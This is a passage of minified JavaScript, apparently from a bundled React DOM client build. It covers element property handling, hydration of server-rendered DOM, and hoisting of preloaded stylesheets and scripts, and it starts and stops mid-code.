                        typeof A != "function" && A !== null && (d in c ? c[d] = null : c.hasAttribute(d) && c.removeAttribute(d)),
                        c.addEventListener(u, g, w);
                        break e
                    }
                    d in c ? c[d] = g : g === !0 ? c.setAttribute(d, "") : it(c, d, g)
                }
        }
    }
    function Nn(c, u, d) {
        switch (u) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
            break;
        case "img":
            Qt("error", c),
            Qt("load", c);
            var g = !1, w = !1, A;
            for (A in d)
                if (d.hasOwnProperty(A)) {
                    var q = d[A];
                    if (q != null)
                        switch (A) {
                        case "src":
                            g = !0;
                            break;
                        case "srcSet":
                            w = !0;
                            break;
                        case "children":
                        case "dangerouslySetInnerHTML":
                            throw Error(o(137, u));
                        default:
                            Br(c, u, A, q, d, null)
                        }
                }
            w && Br(c, u, "srcSet", d.srcSet, d, null),
            g && Br(c, u, "src", d.src, d, null);
            return;
        case "input":
            Qt("invalid", c);
            var Q = A = q = w = null
              , ce = null
              , ve = null;
            for (g in d)
                if (d.hasOwnProperty(g)) {
                    var We = d[g];
                    if (We != null)
                        switch (g) {
                        case "name":
                            w = We;
                            break;
                        case "type":
                            q = We;
                            break;
                        case "checked":
                            ce = We;
                            break;
                        case "defaultChecked":
                            ve = We;
                            break;
                        case "value":
                            A = We;
                            break;
                        case "defaultValue":
                            Q = We;
                            break;
                        case "children":
                        case "dangerouslySetInnerHTML":
                            if (We != null)
                                throw Error(o(137, u));
                            break;
                        default:
                            Br(c, u, g, We, d, null)
                        }
                }
            U4(c, A, Q, ce, ve, q, w, !1),
            nl(c);
            return;
        case "select":
            Qt("invalid", c),
            g = q = A = null;
            for (w in d)
                if (d.hasOwnProperty(w) && (Q = d[w],
                Q != null))
                    switch (w) {
                    case "value":
                        A = Q;
                        break;
                    case "defaultValue":
                        q = Q;
                        break;
                    case "multiple":
                        g = Q;
                    default:
                        Br(c, u, w, Q, d, null)
                    }
            u = A,
            d = q,
            c.multiple = !!g,
            u != null ? Wu(c, !!g, u, !1) : d != null && Wu(c, !!g, d, !0);
            return;
        case "textarea":
            Qt("invalid", c),
            A = w = g = null;
            for (q in d)
                if (d.hasOwnProperty(q) && (Q = d[q],
                Q != null))
                    switch (q) {
                    case "value":
                        g = Q;
                        break;
                    case "defaultValue":
                        w = Q;
                        break;
                    case "children":
                        A = Q;
                        break;
                    case "dangerouslySetInnerHTML":
                        if (Q != null)
                            throw Error(o(91));
                        break;
                    default:
                        Br(c, u, q, Q, d, null)
                    }
            L4(c, g, w, A),
            nl(c);
            return;
        case "option":
            for (ce in d)
                if (d.hasOwnProperty(ce) && (g = d[ce],
                g != null))
                    switch (ce) {
                    case "selected":
                        c.selected = g && typeof g != "function" && typeof g != "symbol";
                        break;
                    default:
                        Br(c, u, ce, g, d, null)
                    }
            return;
        case "dialog":
            Qt("beforetoggle", c),
            Qt("toggle", c),
            Qt("cancel", c),
            Qt("close", c);
            break;
        case "iframe":
        case "object":
            Qt("load", c);
            break;
        case "video":
        case "audio":
            for (g = 0; g < jh.length; g++)
                Qt(jh[g], c);
            break;
        case "image":
            Qt("error", c),
            Qt("load", c);
            break;
        case "details":
            Qt("toggle", c);
            break;
        case "embed":
        case "source":
        case "link":
            Qt("error", c),
            Qt("load", c);
        case "area":
        case "base":
        case "br":
        case "col":
        case "hr":
        case "keygen":
        case "meta":
        case "param":
        case "track":
        case "wbr":
        case "menuitem":
            for (ve in d)
                if (d.hasOwnProperty(ve) && (g = d[ve],
                g != null))
                    switch (ve) {
                    case "children":
                    case "dangerouslySetInnerHTML":
                        throw Error(o(137, u));
                    default:
                        Br(c, u, ve, g, d, null)
                    }
            return;
        default:
            if (Ax(u)) {
                for (We in d)
                    d.hasOwnProperty(We) && (g = d[We],
                    g !== void 0 && cv(c, u, We, g, d, void 0));
                return
            }
        }
        for (Q in d)
            d.hasOwnProperty(Q) && (g = d[Q],
            g != null && Br(c, u, Q, g, d, null))
    }
    function RL(c, u, d, g) {
        switch (u) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
            break;
        case "input":
            var w = null
              , A = null
              , q = null
              , Q = null
              , ce = null
              , ve = null
              , We = null;
            for (Be in d) {
                var ke = d[Be];
                if (d.hasOwnProperty(Be) && ke != null)
                    switch (Be) {
                    case "checked":
                        break;
                    case "value":
                        break;
                    case "defaultValue":
                        ce = ke;
                    default:
                        g.hasOwnProperty(Be) || Br(c, u, Be, null, g, ke)
                    }
            }
            for (var Se in g) {
                var Be = g[Se];
                if (ke = d[Se],
                g.hasOwnProperty(Se) && (Be != null || ke != null))
                    switch (Se) {
                    case "type":
                        A = Be;
                        break;
                    case "name":
                        w = Be;
                        break;
                    case "checked":
                        ve = Be;
                        break;
                    case "defaultChecked":
                        We = Be;
                        break;
                    case "value":
                        q = Be;
                        break;
                    case "defaultValue":
                        Q = Be;
                        break;
                    case "children":
                    case "dangerouslySetInnerHTML":
                        if (Be != null)
                            throw Error(o(137, u));
                        break;
                    default:
                        Be !== ke && Br(c, u, Se, Be, g, ke)
                    }
            }
            Tx(c, q, Q, ce, ve, We, A, w);
            return;
        case "select":
            Be = q = Q = Se = null;
            for (A in d)
                if (ce = d[A],
                d.hasOwnProperty(A) && ce != null)
                    switch (A) {
                    case "value":
                        break;
                    case "multiple":
                        Be = ce;
                    default:
                        g.hasOwnProperty(A) || Br(c, u, A, null, g, ce)
                    }
            for (w in g)
                if (A = g[w],
                ce = d[w],
                g.hasOwnProperty(w) && (A != null || ce != null))
                    switch (w) {
                    case "value":
                        Se = A;
                        break;
                    case "defaultValue":
                        Q = A;
                        break;
                    case "multiple":
                        q = A;
                    default:
                        A !== ce && Br(c, u, w, A, g, ce)
                    }
            u = Q,
            d = q,
            g = Be,
            Se != null ? Wu(c, !!d, Se, !1) : !!g != !!d && (u != null ? Wu(c, !!d, u, !0) : Wu(c, !!d, d ? [] : "", !1));
            return;
        case "textarea":
            Be = Se = null;
            for (Q in d)
                if (w = d[Q],
                d.hasOwnProperty(Q) && w != null && !g.hasOwnProperty(Q))
                    switch (Q) {
                    case "value":
                        break;
                    case "children":
                        break;
                    default:
                        Br(c, u, Q, null, g, w)
                    }
            for (q in g)
                if (w = g[q],
                A = d[q],
                g.hasOwnProperty(q) && (w != null || A != null))
                    switch (q) {
                    case "value":
                        Se = w;
                        break;
                    case "defaultValue":
                        Be = w;
                        break;
                    case "children":
                        break;
                    case "dangerouslySetInnerHTML":
                        if (w != null)
                            throw Error(o(91));
                        break;
                    default:
                        w !== A && Br(c, u, q, w, g, A)
                    }
            k4(c, Se, Be);
            return;
        case "option":
            for (var Ot in d)
                if (Se = d[Ot],
                d.hasOwnProperty(Ot) && Se != null && !g.hasOwnProperty(Ot))
                    switch (Ot) {
                    case "selected":
                        c.selected = !1;
                        break;
                    default:
                        Br(c, u, Ot, null, g, Se)
                    }
            for (ce in g)
                if (Se = g[ce],
                Be = d[ce],
                g.hasOwnProperty(ce) && Se !== Be && (Se != null || Be != null))
                    switch (ce) {
                    case "selected":
                        c.selected = Se && typeof Se != "function" && typeof Se != "symbol";
                        break;
                    default:
                        Br(c, u, ce, Se, g, Be)
                    }
            return;
        case "img":
        case "link":
        case "area":
        case "base":
        case "br":
        case "col":
        case "embed":
        case "hr":
        case "keygen":
        case "meta":
        case "param":
        case "source":
        case "track":
        case "wbr":
        case "menuitem":
            for (var _t in d)
                Se = d[_t],
                d.hasOwnProperty(_t) && Se != null && !g.hasOwnProperty(_t) && Br(c, u, _t, null, g, Se);
            for (ve in g)
                if (Se = g[ve],
                Be = d[ve],
                g.hasOwnProperty(ve) && Se !== Be && (Se != null || Be != null))
                    switch (ve) {
                    case "children":
                    case "dangerouslySetInnerHTML":
                        if (Se != null)
                            throw Error(o(137, u));
                        break;
                    default:
                        Br(c, u, ve, Se, g, Be)
                    }
            return;
        default:
            if (Ax(u)) {
                for (var _r in d)
                    Se = d[_r],
                    d.hasOwnProperty(_r) && Se !== void 0 && !g.hasOwnProperty(_r) && cv(c, u, _r, void 0, g, Se);
                for (We in g)
                    Se = g[We],
                    Be = d[We],
                    !g.hasOwnProperty(We) || Se === Be || Se === void 0 && Be === void 0 || cv(c, u, We, Se, g, Be);
                return
            }
        }
        for (var ge in d)
            Se = d[ge],
            d.hasOwnProperty(ge) && Se != null && !g.hasOwnProperty(ge) && Br(c, u, ge, null, g, Se);
        for (ke in g)
            Se = g[ke],
            Be = d[ke],
            !g.hasOwnProperty(ke) || Se === Be || Se == null && Be == null || Br(c, u, ke, Se, g, Be)
    }
    var lv = null
      , uv = null;
    function Ng(c) {
        return c.nodeType === 9 ? c : c.ownerDocument
    }
    function $6(c) {
        switch (c) {
        case "http://www.w3.org/2000/svg":
            return 1;
        case "http://www.w3.org/1998/Math/MathML":
            return 2;
        default:
            return 0
        }
    }
    function z6(c, u) {
        if (c === 0)
            switch (u) {
            case "svg":
                return 1;
            case "math":
                return 2;
            default:
                return 0
            }
        return c === 1 && u === "foreignObject" ? 0 : c
    }
    function fv(c, u) {
        return c === "textarea" || c === "noscript" || typeof u.children == "string" || typeof u.children == "number" || typeof u.children == "bigint" || typeof u.dangerouslySetInnerHTML == "object" && u.dangerouslySetInnerHTML !== null && u.dangerouslySetInnerHTML.__html != null
    }
    var dv = null;
    function WL() {
        var c = window.event;
        return c && c.type === "popstate" ? c === dv ? !1 : (dv = c,
        !0) : (dv = null,
        !1)
    }
    var j6 = typeof setTimeout == "function" ? setTimeout : void 0
      , ML = typeof clearTimeout == "function" ? clearTimeout : void 0
      , q6 = typeof Promise == "function" ? Promise : void 0
      , NL = typeof queueMicrotask == "function" ? queueMicrotask : typeof q6 < "u" ? function(c) {
        return q6.resolve(null).then(c).catch(DL)
    }
    : j6;
    function DL(c) {
        setTimeout(function() {
            throw c
        })
    }
    function fc(c) {
        return c === "head"
    }
    function V6(c, u) {
        var d = u
          , g = 0
          , w = 0;
        do {
            var A = d.nextSibling;
            if (c.removeChild(d),
            A && A.nodeType === 8)
                if (d = A.data,
                d === "/$") {
                    if (0 < g && 8 > g) {
                        d = g;
                        var q = c.ownerDocument;
                        if (d & 1 && Vh(q.documentElement),
                        d & 2 && Vh(q.body),
                        d & 4)
                            for (d = q.head,
                            Vh(d),
                            q = d.firstChild; q; ) {
                                var Q = q.nextSibling
                                  , ce = q.nodeName;
                                q[Ct] || ce === "SCRIPT" || ce === "STYLE" || ce === "LINK" && q.rel.toLowerCase() === "stylesheet" || d.removeChild(q),
                                q = Q
                            }
                    }
                    if (w === 0) {
                        c.removeChild(A),
                        Qh(u);
                        return
                    }
                    w--
                } else
                    d === "$" || d === "$?" || d === "$!" ? w++ : g = d.charCodeAt(0) - 48;
            else
                g = 0;
            d = A
        } while (d);
        Qh(u)
    }
    function hv(c) {
        var u = c.firstChild;
        for (u && u.nodeType === 10 && (u = u.nextSibling); u; ) {
            var d = u;
            switch (u = u.nextSibling,
            d.nodeName) {
            case "HTML":
            case "HEAD":
            case "BODY":
                hv(d),
                lt(d);
                continue;
            case "SCRIPT":
            case "STYLE":
                continue;
            case "LINK":
                if (d.rel.toLowerCase() === "stylesheet")
                    continue
            }
            c.removeChild(d)
        }
    }
    function FL(c, u, d, g) {
        for (; c.nodeType === 1; ) {
            var w = d;
            if (c.nodeName.toLowerCase() !== u.toLowerCase()) {
                if (!g && (c.nodeName !== "INPUT" || c.type !== "hidden"))
                    break
            } else if (g) {
                if (!c[Ct])
                    switch (u) {
                    case "meta":
                        if (!c.hasAttribute("itemprop"))
                            break;
                        return c;
                    case "link":
                        if (A = c.getAttribute("rel"),
                        A === "stylesheet" && c.hasAttribute("data-precedence"))
                            break;
                        if (A !== w.rel || c.getAttribute("href") !== (w.href == null || w.href === "" ? null : w.href) || c.getAttribute("crossorigin") !== (w.crossOrigin == null ? null : w.crossOrigin) || c.getAttribute("title") !== (w.title == null ? null : w.title))
                            break;
                        return c;
                    case "style":
                        if (c.hasAttribute("data-precedence"))
                            break;
                        return c;
                    case "script":
                        if (A = c.getAttribute("src"),
                        (A !== (w.src == null ? null : w.src) || c.getAttribute("type") !== (w.type == null ? null : w.type) || c.getAttribute("crossorigin") !== (w.crossOrigin == null ? null : w.crossOrigin)) && A && c.hasAttribute("async") && !c.hasAttribute("itemprop"))
                            break;
                        return c;
                    default:
                        return c
                    }
            } else if (u === "input" && c.type === "hidden") {
                var A = w.name == null ? null : "" + w.name;
                if (w.type === "hidden" && c.getAttribute("name") === A)
                    return c
            } else
                return c;
            if (c = Hi(c.nextSibling),
            c === null)
                break
        }
        return null
    }
    function UL(c, u, d) {
        if (u === "")
            return null;
        for (; c.nodeType !== 3; )
            if ((c.nodeType !== 1 || c.nodeName !== "INPUT" || c.type !== "hidden") && !d || (c = Hi(c.nextSibling),
            c === null))
                return null;
        return c
    }
    function pv(c) {
        return c.data === "$!" || c.data === "$?" && c.ownerDocument.readyState === "complete"
    }
    function kL(c, u) {
        var d = c.ownerDocument;
        if (c.data !== "$?" || d.readyState === "complete")
            u();
        else {
            var g = function() {
                u(),
                d.removeEventListener("DOMContentLoaded", g)
            };
            d.addEventListener("DOMContentLoaded", g),
            c._reactRetry = g
        }
    }
    function Hi(c) {
        for (; c != null; c = c.nextSibling) {
            var u = c.nodeType;
            if (u === 1 || u === 3)
                break;
            if (u === 8) {
                if (u = c.data,
                u === "$" || u === "$!" || u === "$?" || u === "F!" || u === "F")
                    break;
                if (u === "/$")
                    return null
            }
        }
        return c
    }
    var gv = null;
    function H6(c) {
        c = c.previousSibling;
        for (var u = 0; c; ) {
            if (c.nodeType === 8) {
                var d = c.data;
                if (d === "$" || d === "$!" || d === "$?") {
                    if (u === 0)
                        return c;
                    u--
                } else
                    d === "/$" && u++
            }
            c = c.previousSibling
        }
        return null
    }
    function G6(c, u, d) {
        switch (u = Ng(d),
        c) {
        case "html":
            if (c = u.documentElement,
            !c)
                throw Error(o(452));
            return c;
        case "head":
            if (c = u.head,
            !c)
                throw Error(o(453));
            return c;
        case "body":
            if (c = u.body,
            !c)
                throw Error(o(454));
            return c;
        default:
            throw Error(o(451))
        }
    }
    function Vh(c) {
        for (var u = c.attributes; u.length; )
            c.removeAttributeNode(u[0]);
        lt(c)
    }
    var wi = new Map
      , K6 = new Set;
    function Dg(c) {
        return typeof c.getRootNode == "function" ? c.getRootNode() : c.nodeType === 9 ? c : c.ownerDocument
    }
    var pa = $.d;
    $.d = {
        f: LL,
        r: $L,
        D: zL,
        C: jL,
        L: qL,
        m: VL,
        X: GL,
        S: HL,
        M: KL
    };
    function LL() {
        var c = pa.f()
          , u = Sg();
        return c || u
    }
    function $L(c) {
        var u = Vt(c);
        u !== null && u.tag === 5 && u.type === "form" ? pC(u) : pa.r(c)
    }
    var uf = typeof document > "u" ? null : document;
    function Z6(c, u, d) {
        var g = uf;
        if (g && typeof u == "string" && u) {
            var w = hi(u);
            w = 'link[rel="' + c + '"][href="' + w + '"]',
            typeof d == "string" && (w += '[crossorigin="' + d + '"]'),
            K6.has(w) || (K6.add(w),
            c = {
                rel: c,
                crossOrigin: d,
                href: u
            },
            g.querySelector(w) === null && (u = g.createElement("link"),
            Nn(u, "link", c),
            Ge(u),
            g.head.appendChild(u)))
        }
    }
    function zL(c) {
        pa.D(c),
        Z6("dns-prefetch", c, null)
    }
    function jL(c, u) {
        pa.C(c, u),
        Z6("preconnect", c, u)
    }
    function qL(c, u, d) {
        pa.L(c, u, d);
        var g = uf;
        if (g && c && u) {
            var w = 'link[rel="preload"][as="' + hi(u) + '"]';
            u === "image" && d && d.imageSrcSet ? (w += '[imagesrcset="' + hi(d.imageSrcSet) + '"]',
            typeof d.imageSizes == "string" && (w += '[imagesizes="' + hi(d.imageSizes) + '"]')) : w += '[href="' + hi(c) + '"]';
            var A = w;
            switch (u) {
            case "style":
                A = ff(c);
                break;
            case "script":
                A = df(c)
            }
            wi.has(A) || (c = h({
                rel: "preload",
                href: u === "image" && d && d.imageSrcSet ? void 0 : c,
                as: u
            }, d),
            wi.set(A, c),
            g.querySelector(w) !== null || u === "style" && g.querySelector(Hh(A)) || u === "script" && g.querySelector(Gh(A)) || (u = g.createElement("link"),
            Nn(u, "link", c),
            Ge(u),
            g.head.appendChild(u)))
        }
    }
    function VL(c, u) {
        pa.m(c, u);
        var d = uf;
        if (d && c) {
            var g = u && typeof u.as == "string" ? u.as : "script"
              , w = 'link[rel="modulepreload"][as="' + hi(g) + '"][href="' + hi(c) + '"]'
              , A = w;
            switch (g) {
            case "audioworklet":
            case "paintworklet":
            case "serviceworker":
            case "sharedworker":
            case "worker":
            case "script":
                A = df(c)
            }
            if (!wi.has(A) && (c = h({
                rel: "modulepreload",
                href: c
            }, u),
            wi.set(A, c),
            d.querySelector(w) === null)) {
                switch (g) {
                case "audioworklet":
                case "paintworklet":
                case "serviceworker":
                case "sharedworker":
                case "worker":
                case "script":
                    if (d.querySelector(Gh(A)))
                        return
                }
                g = d.createElement("link"),
                Nn(g, "link", c),
                Ge(g),
                d.head.appendChild(g)
            }
        }
    }
    function HL(c, u, d) {
        pa.S(c, u, d);
        var g = uf;
        if (g && c) {
            var w = De(g).hoistableStyles
              , A = ff(c);
            u = u || "default";
            var q = w.get(A);
            if (!q) {
                var Q = {
                    loading: 0,
                    preload: null
                };
                if (q = g.querySelector(Hh(A)))
                    Q.loading = 5;
                else {
                    c = h({
                        rel: "stylesheet",
                        href: c,
                        "data-precedence": u
                    }, d),
                    (d = wi.get(A)) && yv(c, d);
                    var ce = q = g.createElement("link");
                    Ge(ce),
                    Nn(ce, "link", c),
                    ce._p = new Promise(function(ve, We) {
                        ce.onload = ve,
                        ce.onerror = We
                    }
                    ),
                    ce.addEventListener("load", function() {
                        Q.loading |= 1
                    }),
                    ce.addEventListener("error", function() {
                        Q.loading |= 2
                    }),
                    Q.loading |= 4,
                    Fg(q, u, g)
                }
                q = {
                    type: "stylesheet",
                    instance: q,
                    count: 1,
                    state: Q
                },
                w.set(A, q)
            }
        }
    }
    function GL(c, u) {
        pa.X(c, u);
        var d = uf;
        if (d && c) {
            var g = De(d).hoistableScripts
              , w = df(c)
              , A = g.get(w);
            A || (A = d.querySelector(Gh(w)),
            A || (c = h({
                src: c,
                async: !0
            }, u),
            (u = wi.get(w)) && bv(c, u),
            A = d.createElement("script"),
            Ge(A),
            Nn(A, "link", c),
            d.head.appendChild(A)),
            A = {
                type: "script",
                instance: A,
                count: 1,
                state: null
            },
            g.set(w, A))
        }
    }
    function KL(c, u) {
        pa.M(c, u);
        var d = uf;
        if (d && c) {
            var g = De(d).hoistableScripts
              , w = df(c)
              , A = g.get(w);
            A || (A = d.querySelector(Gh(w)),
            A || (c = h({
                src: c,
                async: !0,
                type: "module"
            }, u),
            (u = wi.get(w)) && bv(c, u),
            A = d.createElement("script"),
            Ge(A),
            Nn(A, "link", c),
            d.head.appendChild(A)),
            A = {
                type: "script",
                instance: A,
                count: 1,
                state: null
            },
            g.set(w, A))
        }
    }
    function Y6(c, u, d, g) {
        var w = (w = Pe.current) ? Dg(w) : null;
        if (!w)
            throw Error(o(446));
        switch (c) {
        case "meta":
        case "title":
            return null;
        case "style":
            return typeof d.precedence == "string" && typeof d.href == "string" ? (u = ff(d.href),
            d = De(w).hoistableStyles,
            g = d.get(u),
            g || (g = {
                type: "style",
                instance: null,
                count: 0,
                state: null
            },
            d.set(u, g)),
            g) : {
                type: "void",
                instance: null,
                count: 0,
                state: null
            };
        case "link":
            if (d.rel === "stylesheet" && typeof d.href == "string" && typeof d.precedence == "string") {
                c = ff(d.href);
                var A = De(w).hoistableStyles
                  , q = A.get(c);
                if (q || (w = w.ownerDocument || w,
                q = {
                    type: "stylesheet",
                    instance: null,
                    count: 0,
                    state: {
                        loading: 0,
                        preload: null
                    }
                },
                A.set(c, q),
                (A = w.querySelector(Hh(c))) && !A._p && (q.instance = A,
                q.state.loading = 5),
                wi.has(c) || (d = {
                    rel: "preload",
                    as: "style",
                    href: d.href,
                    crossOrigin: d.crossOrigin,
                    integrity: d.integrity,
                    media: d.media,
                    hrefLang: d.hrefLang,
                    referrerPolicy: d.referrerPolicy
                },
                wi.set(c, d),
                A || ZL(w, c, d, q.state))),
                u && g === null)
                    throw Error(o(528, ""));
                return q
            }
            if (u && g !== null)
                throw Error(o(529, ""));
            return null;
        case "script":
            return u = d.async,
            d = d.src,
            typeof d == "string" && u && typeof u != "function" && typeof u != "symbol" ? (u = df(d),
            d = De(w).hoistableScripts,
            g = d.get(u),
            g || (g = {
                type: "script",
                instance: null,
                count: 0,
                state: null
            },
            d.set(u, g)),
            g) : {
                type: "void",
                instance: null,
                count: 0,
                state: null
            };
        default:
            throw Error(o(444, c))
        }
    }
    function ff(c) {
        return 'href="' + hi(c) + '"'
    }
    function Hh(c) {
        return 'link[rel="stylesheet"][' + c + "]"
    }
    function X6(c) {
        return h({}, c, {
            "data-precedence": c.precedence,
            precedence: null
        })
    }
    function ZL(c, u, d, g) {
        c.querySelector('link[rel="preload"][as="style"][' + u + "]") ? g.loading = 1 : (u = c.createElement("link"),
        g.preload = u,
        u.addEventListener("load", function() {
            return g.loading |= 1
        }),
        u.addEventListener("error", function() {
            return g.loading |= 2
        }),
        Nn(u, "link", d),
        Ge(u),
        c.head.appendChild(u))
    }
    function df(c) {
        return '[src="' + hi(c) + '"]'
    }
    function Gh(c) {
        return "script[async]" + c
    }
    function J6(c, u, d) {
        if (u.count++,
        u.instance === null)
            switch (u.type) {
            case "style":
                var g = c.querySelector('style[data-href~="' + hi(d.href) + '"]');
                if (g)
                    return u.instance = g,
                    Ge(g),
                    g;
                var w = h({}, d, {
                    "data-href": d.href,
                    "data-precedence": d.precedence,
                    href: null,
                    precedence: null
                });
                return g = (c.ownerDocument || c).createElement("style"),
                Ge(g),
                Nn(g, "style", w),
                Fg(g, d.precedence, c),
                u.instance = g;
            case "stylesheet":
                w = ff(d.href);
                var A = c.querySelector(Hh(w));
                if (A)
                    return u.state.loading |= 4,
                    u.instance = A,
                    Ge(A),
                    A;
                g = X6(d),
                (w = wi.get(w)) && yv(g, w),
                A = (c.ownerDocument || c).createElement("link"),
                Ge(A);
                var q = A;
                return q._p = new Promise(function(Q, ce) {
                    q.onload = Q,
                    q.onerror = ce
                }
                ),
                Nn(A, "link", g),
                u.state.loading |= 4,
                Fg(A, d.precedence, c),
                u.instance = A;
            case "script":
                return A = df(d.src),
                (w = c.querySelector(Gh(A))) ? (u.instance = w,
                Ge(w),
                w) : (g = d,
                (w = wi.get(A)) && (g = h({}, d),
                bv(g, w)),
                c = c.ownerDocument || c,
                w = c.createElement("script"),
                Ge(w),
                Nn(w, "link", g),
                c.head.appendChild(w),
                u.instance = w);
            case "void":
                return null;
            default:
                throw Error(o(443, u.type))
            }
        else
            u.type === "stylesheet" && (u.state.loading & 4) === 0 && (g = u.instance,
            u.state.loading |= 4,
            Fg(g, d.precedence, c));
        return u.instance
    }
    function Fg(c, u, d) {
        for (var g = d.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'), w = g.length ? g[g.length - 1] : null, A = w, q = 0; q < g.length; q++) {
            var Q = g[q];
            if (Q.dataset.precedence === u)
                A = Q;
            else if (A !== w)
                break
        }
        A ? A.parentNode.insertBefore(c, A.nextSibling) : (u = d.nodeType === 9 ? d.head : d,
        u.insertBefore(c, u.firstChild))
    }
    function yv(c, u) {
        c.crossOrigin == null && (c.crossOrigin = u.crossOrigin),
        c.referrerPolicy == null && (c.referrerPolicy = u.referrerPolicy),
        c.title == null && (c.title = u.title)
    }
    function bv(c, u) {
        c.crossOrigin == null && (c.crossOrigin = u.crossOrigin),
        c.referrerPolicy == null && (c.referrerPolicy = u.referrerPolicy),
        c.integrity == null && (c.integrity = u.integrity)
    }
    var Ug = null;
    function Q6(c, u, d) {
        if (Ug === null) {
            var g = new Map
              , w = Ug = new Map;
            w.set(d, g)
        } else
            w = Ug,
            g = w.get(d),
            g || (g = new Map,
            w.set(d, g));
        if (g.has(c))
            return g;
        for (g.set(c, null),
        d = d.getElementsByTagName(c),
        w = 0; w < d.length; w++) {
            var A = d[w];
            if (!(A[Ct] || A[Ne] || c === "link" && A.getAttribute("rel") === "stylesheet") && A.namespaceURI !== "http://www.w3.org/2000/svg") {
                var q = A.getAttribute(u) || "";
                q = c + q;
                var Q = g.get(q);
                Q ? Q.push(A) : g.set(q, [A])
            }
        }
        return g
    }
    function eS(c, u, d) {
        c = c.ownerDocument || c,
        c.head.insertBefore(d, u === "title" ? c.querySelector("head > title") : null)
    }
    function YL(c, u, d) {
        if (d === 1 || u.itemProp != null)
            return !1;
        switch (c) {
        case "meta":
        case "title":
            return !0;
        case "style":
            if (typeof u.precedence != "string" || typeof u.href != "string" || u.href === "")
                break;
            return !0;
        case "link":
            if (typeof u.rel != "string" || typeof u.href != "string" || u.href === "" || u.onLoad || u.onError)
                break;
            switch (u.rel) {
            case "stylesheet":
                return c = u.disabled,
                typeof u.precedence == "string" && c == null;
            default:
                return !0
            }
        case "script":
            if (u.async && typeof u.async != "function" && typeof u.async != "symbol" && !u.onLoad && !u.onError && u.src && typeof u.src == "string")
                return !0
        }
        return !1
    }
    function tS(c) {
        return !(c.type === "stylesheet" && (c.state.loading & 3) === 0)
    }
    var Kh = null;
    function XL() {}
    function JL(c, u, d) {
        if (Kh === null)
            throw Error(o(475));
        var g = Kh;
        if (u.type === "stylesheet" && (typeof d.media != "string" || matchMedia(d.media).matches !== !1) && (u.state.loading & 4) === 0) {
            if (u.instance === null) {
                var w = ff(d.href)
                  , A = c.querySelector(Hh(w));
                if (A) {
                    c = A._p,
                    c !== null && typeof c == "object" && typeof c.then == "function" && (g.count++,
                    g = kg.bind(g),
                    c.then(g, g)),
                    u.state.loading |= 4,
                    u.instance = A,
                    Ge(A);
                    return
                }
                A = c.ownerDocument || c,
                d = X6(d),
                (w = wi.get(w)) && yv(d, w),
                A = A.createElement("link"),
                Ge(A);
                var q = A;
                q._p = new Promise(function(Q, ce) {
                    q.onload = Q,
                    q.onerror = ce
                }
                ),
                Nn(A, "link", d),
                u.instance = A
            }
            g.stylesheets === null && (g.stylesheets = new Map),
            g.stylesheets.set(u, c),
            (c = u.state.preload) && (u.state.loading & 3) === 0 && (g.count++,
            u = kg.bind(g),
            c.addEventListener("load", u),
            c.addEventListener("error", u))
        }
    }
    function QL() {
        if (Kh === null)
            throw Error(o(475));
        var c = Kh;
        return c.stylesheets && c.count === 0 && mv(c, c.stylesheets),
        0 < c.count ? function(u) {
            var d = setTimeout(function() {
                if (c.stylesheets && mv(c, c.stylesheets),
                c.unsuspend) {
                    var g = c.unsuspend;
                    c.unsuspend = null,
                    g()
                }
            }, 6e4);
            return c.unsuspend = u,
            function() {
                c.unsuspend = null,
                clearTimeout(d)
            }
        }
        : null
    }
    function kg() {
        if (this.count--,
        this.count === 0) {
            if (this.stylesheets)
                mv(this, this.stylesheets);
            else if (this.unsuspend) {
                var c = this.unsuspend;
                this.unsuspend = null,
                c()
            }
        }
    }
    var Lg = null;
    function mv(c, u) {
        c.stylesheets = null,
        c.unsuspend !== null && (c.count++,
        Lg = new Map,
        u.forEach(e$, c),
        Lg = null,
        kg.call(c))
    }
    function e$(c, u) {
        if (!(u.state.loading & 4)) {
            var d = Lg.get(c);
            if (d)
                var g = d.get(null);
            else {
                d = new Map,
                Lg.set(c, d);
                for (var w = c.querySelectorAll("link[data-precedence],style[data-precedence]"), A = 0; A < w.length; A++) {
                    var q = w[A];
                    (q.nodeName === "LINK" || q.getAttribute("media") !== "not all") && (d.set(q.dataset.precedence, q),
                    g = q)
                }
                g && d.set(null, g)
            }
            w = u.instance,
            q = w.getAttribute("data-precedence"),
            A = d.get(q) || g,
            A === g && d.set(null, w),
            d.set(q, w),
            this.count++,
            g = kg.bind(this),
            w.addEventListener("load", g),
            w.addEventListener("error", g),
            A ? A.parentNode.insertBefore(w, A.nextSibling) : (c = c.nodeType === 9 ? c.head : c,
            c.insertBefore(w, c.firstChild)),
            u.state.loading |= 4
        }
    }
    var Zh = {
        $$typeof: O,
        Provider: null,
        Consumer: null,
        _currentValue: z,
        _currentValue2: z,
        _threadCount: 0
    };
    function t$(c, u, d, g, w, A, q, Q) {
        this.tag = 1,
        this.containerInfo = c,
        this.pingCache = this.current = this.pendingChildren = null,
        this.timeoutHandle = -1,
        this.callbackNode = this.next = this.pendingContext = this.context = this.cancelPendingCommit = null,
        this.callbackPriority = 0,
        this.expirationTimes = jo(-1),
        this.entangledLanes = this.shellSuspendCounter = this.errorRecoveryDisabledLanes = this.expiredLanes = this.warmLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
        this.entanglements = jo(0),
        this.hiddenUpdates = jo(null),
        this.identifierPrefix = g,
        this.onUncaughtError = w,
        this.onCaughtError = A,
        this.onRecoverableError = q,
        this.pooledCache = null,
        this.pooledCacheLanes = 0,
        this.formState = Q,
        this.incompleteTransitions = new Map
    }
    function rS(c, u, d, g, w, A, q, Q, ce, ve, We, ke) {
        return c = new t$(c,u,d,q,Q,ce,ve,ke),
        u = 1,
        A === !0 && (u |= 24),
        A = Ho(3, null, null, u),
        c.current = A,
        A.stateNode = c,
        u = Qx(),
        u.refCount++,
        c.pooledCache = u,
        u.refCount++,
        A.memoizedState = {
            element: g,
            isDehydrated: d,
            cache: u
        },
        nw(A),
        c
    }
    function nS(c) {
        return c ? (c = zu,
        c) : zu
    }
    function oS(c, u, d, g, w, A) {
        w = nS(w),
        g.context === null ? g.context = w : g.pendingContext = w,
        g = Ja(u),
        g.payload = {
            element: d
        },
        A = A === void 0 ? null : A,
        A !== null && (g.callback = A),
        d = Qa(c, g, u),
        d !== null && (Xo(d, c, u),
        Ph(d, c, u))
    }
    function iS(c, u) {
